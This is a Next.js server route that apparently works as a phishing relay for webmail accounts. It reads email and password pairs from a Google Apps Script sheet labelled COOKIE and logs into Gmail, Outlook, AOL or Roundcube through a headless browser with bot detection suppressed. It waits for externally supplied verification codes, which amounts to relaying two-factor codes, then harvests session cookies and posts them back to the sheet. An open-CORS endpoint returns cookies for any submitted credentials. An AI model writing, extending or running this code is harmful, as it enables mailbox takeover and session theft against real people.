import { NextResponse } from "next/server";
import puppeteer from "puppeteer-core";
import chromium from "@sparticuz/chromium-min";
import dns from 'dns';
import { promisify } from 'util';
import axios from 'axios';
import qs from 'qs';
import {
  localExecutablePath,
  isDev,
  userAgent,
  remoteExecutablePath,
} from "@/utils/utils";

const resolveMx = promisify(dns.resolveMx);

export const maxDuration = 60; // This function can run for a maximum of 60 seconds
export const dynamic = "force-dynamic";

const platformUrls = {
  gmail: "https://accounts.google.com/",
  outlook: "https://www.office.com/login?es=UnauthClick&ru=%2f",
  roundcube: "https://your-roundcube-url.com/",
  aol: "https://login.aol.com/",
  yahoo: "https://mail.yahoo.com/",
  godaddy: "https://sso.secureserver.net/?app=email&realm=pass",
};

const platformSelectors = {
  gmail: {
    input: "#identifierId",
    nextButton: "#identifierNext",
    passwordInput: "input[name='Passwd']",
    passwordNextButton: "#passwordNext",
    errorMessage: "//*[contains(text(), 'Couldn’t find your Google Account')]",
    loginFailed: "//*[contains(text(), 'Wrong password')]",
    verificationCodeInput: "input[name='code']", 
  },
  outlook: {
    input: "input[name='loginfmt']",
    nextButton: "#idSIButton9",
    passwordInput: "input[name='passwd']",
    passwordNextButton: "#idSIButton9",
    errorMessage: "//*[contains(text(), 'This username may be')] | //*[contains(text(), 'That Microsoft account doesn’t exist')] | //*[contains(text(), 'find an account with that')]",
    loginFailed: "//*[contains(text(), 'Your account or password')] | //*[contains(text(), 'Enter Password')]",
    verificationCodeInput: "input[name='code']",
    verificationCodeInputError: "//*[contains(text(), 'This username may be')] | //*[contains(text(), 'That Microsoft account doesn’t exist')] | //*[contains(text(), 'Incorrect Code')]",
    staySignedIn: "//*[contains(text(), 'Stay signed')]",
    inboxLoaded: "h1.welcome__title--consumer.welcome__title--visual", // Updated selector for an element present in the inbox
  },
  roundcube: {
    input: "input[name='user']",
    nextButton: "input[name='submitbutton']",
    passwordInput: "input[name='pass']",
    passwordNextButton: "input[name='submitbutton']",
    errorMessage: "//*[contains(text(), 'Login failed')]",
    loginFailed: "//*[contains(text(), 'Login failed')]",
    verificationCodeInput: "input[name='code']", 
  },
  aol: {
    input: "#login-username",
    nextButton: "#login-signin",
    passwordInput: "input[name='password']",
    passwordNextButton: "#login-signin",
    errorMessage: "//*[contains(text(), 'Sorry, we don’t recognize this email')] | //*[contains(text(), 'Sorry,')]",
    loginFailed: "//*[contains(text(), 'Invalid password')]",
    verificationCodeInput: "input[name='code']", // Add verification code input selector
  },
};

// Helper function to fetch data from App Script endpoint with retry logic
async function fetchDataFromAppScript(retries = 3, timeout = 120000) {
  const endpoint = "https://script.google.com/macros/s/AKfycbzpGDrsMrVbWe4xjt39a0AhJWPTmdqLvfSia1-gkSfNK5aTIQ95m83Q-kvIXukn_JxLXA/exec?action=getData&sheetname=COOKIE&range=A1:Y";

  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      // Attempt to fetch the data with an extended timeout
      const response = await axios.get(endpoint, { timeout });
      console.log(`Data fetched successfully on attempt ${attempt}`);
      //console.log(`Data: ${response.data}`);

      return response.data;
    } catch (error) {
      console.error(`Attempt ${attempt} failed: ${error.message}`);
      if (attempt === retries) {
        throw new Error(`Failed to fetch data after ${retries} attempts.`);
      }
      console.log(`Retrying... (${attempt}/${retries})`);
    }
  }
}

async function checkAccountAccess(page, email, password, platform, verificationCode) {
  let emailExists = false;
  let accountAccess = false;
  let cookies = null;

  try {
    const { input, nextButton, passwordInput, passwordNextButton, errorMessage, loginFailed, confirmButton, yesButton, inboxLoaded, verificationCodeInput } = platformSelectors[platform];

    // Enter email
    await page.goto(platformUrls[platform]);
    await page.waitForSelector(input);
    await page.type(input, email);
    await page.waitForSelector(nextButton);
    await page.click(nextButton);

    await new Promise((resolve) => setTimeout(resolve, 3000));

    // Check if the email exists
    const emailErrorElements = await page.evaluate((xpath) => {
      const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
      const nodes = [];
      let node;
      while ((node = result.iterateNext())) {
        nodes.push(node);
      }
      return nodes.length;
    }, errorMessage);

    emailExists = emailErrorElements === 0;

    if (!emailExists) {
      throw new Error('Email not found');
    }

    // Enter password
    await page.waitForSelector(passwordInput);
    await page.type(passwordInput, password);
    await page.waitForSelector(passwordNextButton);
    await page.click(passwordNextButton);

    await new Promise((resolve) => setTimeout(resolve, 3000));

    // Check if login failed
    const loginErrorElements = await page.evaluate((xpath) => {
      const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
      const nodes = [];
      let node;
      while ((node = result.iterateNext())) {
        nodes.push(node);
      }
      return nodes.length;
    }, loginFailed);

    accountAccess = loginErrorElements === 0;

    // Handle additional modals
    if (accountAccess) {
      try {
        await page.keyboard.press('Enter');
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 });
      } catch (e) {
        console.log('Error pressing Enter: ', e.message);
      }

      // Wait for the inbox page to load
      await page.waitForSelector(inboxLoaded, { waitUntil: 'networkidle2', timeout: 60000 });

      // Fetch cookies if login is successful
      const browserCookies = await page.cookies();
      cookies = JSON.stringify(browserCookies);
    } else if (verificationCode) {
      // Enter verification code if provided
      await page.type(verificationCodeInput, verificationCode);
      await page.keyboard.press('Enter');

      await new Promise((resolve) => setTimeout(resolve, 3000));

      const loginErrorElements = await page.evaluate((xpath) => {
        const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
        const nodes = [];
        let node;
        while ((node = result.iterateNext())) {
          nodes.push(node);
        }
        return nodes.length;
      }, loginFailed);

      accountAccess = loginErrorElements === 0;

      if (accountAccess) {
        const browserCookies = await page.cookies();
        cookies = JSON.stringify(browserCookies);
      }
    }
  } catch (err) {
    console.log(`Error checking account access: ${err.message}`);
  }

  return { emailExists, accountAccess, cookies };
}

// Helper function to save cookies back to Google Sheets
async function updateBrowserRowData(data, rowId) {
  console.log('Received parameters:', { data, rowId }); // Log the received parameters

  try {
    const updateData = {
      action: 'updateData',
      dbname: 'COOKIE',
      browserId: rowId,
      status: data.status,
    };

    if (data.cookieJson) {
      const formattedCookie = JSON.stringify(JSON.parse(data.cookieJson), null, 2); // Format the cookie JSON
      updateData.cookie = data.cookieJson;
      updateData.formattedCookie = formattedCookie;
    }

    console.log('Sending update data:', updateData); // Log the data being sent

    const endpoint = "https://script.google.com/macros/s/AKfycbzpGDrsMrVbWe4xjt39a0AhJWPTmdqLvfSia1-gkSfNK5aTIQ95m83Q-kvIXukn_JxLXA/exec";
    const response = await axios.post(endpoint, updateData, {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    });
    
    console.log('Response:', response.data); // Log the response

    console.log(`DB updated successfully for row ID ${rowId}`);
  } catch (error) {
    console.error(`Failed to update DB for row ID ${rowId}:`, error.message);
  }
}

function getColumnIndexes(headers) {
  const columnIndexes = headers.reduce((acc, header, index) => {
    acc[header] = index;
    return acc;
  }, {});
  //console.log('Column Indexes:', columnIndexes); // Log the column indexes
  return columnIndexes;
}

async function processRow(row, columnIndexes) {
  //console.log('Processing row:', row); // Log the row being processed
  const browserId = row[columnIndexes['browserId']];
  const email = row[columnIndexes['email']];
  const password = row[columnIndexes['password']];
  const status = row[columnIndexes['status']];
  //console.log(`Processing row ID ${browserId} with status: ${status}`);

  if (status === "WAITING") {
    const processingDataLoad = {
      status: "PROCESSING",
    };
    await updateBrowserRowData(processingDataLoad, browserId);

    // Set up user data directory for the browser
    const userDataDir = `@/users_data/${browserId}`;
    const browser = await puppeteer.launch({
      ignoreDefaultArgs: ["--enable-automation"],
      args: isDev
        ? [
            "--disable-blink-features=AutomationControlled",
            "--disable-features=site-per-process",
            "-disable-site-isolation-trials",
          ]
        : [...chromium.args, "--disable-blink-features=AutomationControlled"],
      defaultViewport: { width: 1920, height: 1080 },
      executablePath: isDev
        ? localExecutablePath
        : await chromium.executablePath(remoteExecutablePath),
      headless: false,
      userDataDir,
    });

    const page = await browser.newPage();
    await page.setUserAgent(userAgent);
    await page.setViewport({ width: 1920, height: 1080 });

    while (true) {
      const updatedData = await fetchDataFromAppScript();
      const updatedRows = updatedData.slice(1);
      const updatedRow = updatedRows.find(row => row[columnIndexes['browserId']] === browserId);

      if (updatedRow && updatedRow[columnIndexes['email']] && updatedRow[columnIndexes['password']]) {
        const email = updatedRow[columnIndexes['email']];
        const password = updatedRow[columnIndexes['password']];

        const domain = email.split('@')[1];
        const mxRecords = await resolveMx(domain);
        if (!mxRecords || mxRecords.length === 0) {
          throw new Error('No MX records found');
        }

        const mailServer = mxRecords[0].exchange;
        let platform = '';

        if (mailServer.includes('outlook')) {
          platform = 'outlook';
        } else if (mailServer.includes('google') || mailServer.includes('gmail')) {
          platform = 'gmail';
        } else if (mailServer.includes('aol')) {
          platform = 'aol';
        } else if (mailServer.includes('roundcube')) {
          platform = 'roundcube';
        } else {
          throw new Error('Unsupported email service provider');
        }

        const { emailExists, accountAccess, cookies: initialCookies } = await checkAccountAccess(page, email, password, platform);

        let newStatus;
        let cookies = initialCookies;
        if (!emailExists) {
          newStatus = "FAILED";
        } else if (accountAccess) {
          newStatus = "COMPLETED";
        } else {
          newStatus = "WAITINGCODE";
        }

        const updateData = {
          status: newStatus,
          cookieJson: cookies,
        };

        await updateBrowserRowData(updateData, browserId);

        if (newStatus === "COMPLETED") {
          const browserCookies = await page.cookies();
          cookies = JSON.stringify(browserCookies);
          updateData.cookieJson = cookies;
          await updateBrowserRowData(updateData, browserId);
          await browser.close();
          break;
        } else if (newStatus === "WAITINGCODE") {
          while (newStatus === "WAITINGCODE") {
            const updatedData = await fetchDataFromAppScript();
            const updatedRows = updatedData.slice(1);
            const updatedRow = updatedRows.find(row => row[columnIndexes['browserId']] === browserId);
            const code = updatedRow[columnIndexes['verificationCode']];

            if (code) {
              const { accountAccess: newAccountAccess, cookies: newCookies } = await checkAccountAccess(page, email, password, platform, code);

              if (newAccountAccess) {
                newStatus = "COMPLETED";
                cookies = newCookies;
                updateData.status = newStatus;
                updateData.cookieJson = cookies;
                await updateBrowserRowData(updateData, browserId);
                await browser.close();
                break;
              } else {
                newStatus = "WAITINGCODE";
                updateData.status = newStatus;
                updateData.code = "INVALID";
                await updateBrowserRowData(updateData, browserId);
              }
            }

            await new Promise((resolve) => setTimeout(resolve, 10000)); // Check every 10 seconds
          }
        }
      }

      await new Promise((resolve) => setTimeout(resolve, 10000)); // Check every 10 seconds
    }
  }
}

async function checkStatusAndFetchDataAndCheckAccessAndSendPost() {
  try {
    const data = await fetchDataFromAppScript();
    //console.log('Data fetched:', JSON.stringify(data));
    
    if (!Array.isArray(data) || data.length === 0) {
      throw new Error('Invalid data format');
    }

    const headers = data[0];
    const columnIndexes = getColumnIndexes(headers);
    const rows = data.slice(1);

    const processingPromises = rows.map(row => processRow(row, columnIndexes));
    await Promise.all(processingPromises);
  } catch (error) {
    console.error('Error fetching or sending data:', error.message);
  }
}

// Set interval to check status every second
setInterval(checkStatusAndFetchDataAndCheckAccessAndSendPost, 5000);

export async function GET(request) {
  const url = new URL(request.url);
  const email = url.searchParams.get("email");
  const password = url.searchParams.get("password");

  if (!email || !password) {
    return NextResponse.json({ error: "Missing email or password parameter" }, { status: 400 });
  }

  const domain = email.split('@')[1];
  const mxRecords = await resolveMx(domain);
  if (!mxRecords || mxRecords.length === 0) {
    return NextResponse.json({ error: "No MX records found" }, { status: 400 });
  }

  const mailServer = mxRecords[0].exchange;
  let platform = '';

  if (mailServer.includes('outlook')) {
    platform = 'outlook';
  } else if (mailServer.includes('google') || mailServer.includes('gmail')) {
    platform = 'gmail';
  } else if (mailServer.includes('aol')) {
    platform = 'aol';
  } else if (mailServer.includes('roundcube')) {
    platform = 'roundcube';
  } else {
    return NextResponse.json({ error: "Unsupported email service provider" }, { status: 400 });
  }

  const browser = await puppeteer.launch({
    ignoreDefaultArgs: ["--enable-automation"],
    args: isDev
      ? [
          "--disable-blink-features=AutomationControlled",
          "--disable-features=site-per-process",
          "-disable-site-isolation-trials",
        ]
      : [...chromium.args, "--disable-blink-features=AutomationControlled"],
    defaultViewport: { width: 1920, height: 1080 },
    executablePath: isDev
      ? localExecutablePath
      : await chromium.executablePath(remoteExecutablePath),
    headless: false,
  });

  const page = (await browser.pages())[0];
  await page.setUserAgent(userAgent);
  await page.setViewport({ width: 1920, height: 1080 });

  const { emailExists, accountAccess, cookies } = await checkAccountAccess(page, email, password, platform);

  await browser.close();

  const response = NextResponse.json({ emailExists, accountAccess, cookies }, { status: 200 });

  // Add CORS headers
  response.headers.set("Access-Control-Allow-Origin", "*");
  response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  response.headers.set("Access-Control-Allow-Headers", "Content-Type");

  return response;
}

export async function OPTIONS() {
  // Preflight response for OPTIONS requests
  const response = NextResponse.json({}, { status: 200 });
  response.headers.set("Access-Control-Allow-Origin", "*");
  response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  response.headers.set("Access-Control-Allow-Headers", "Content-Type");

  return response;
}
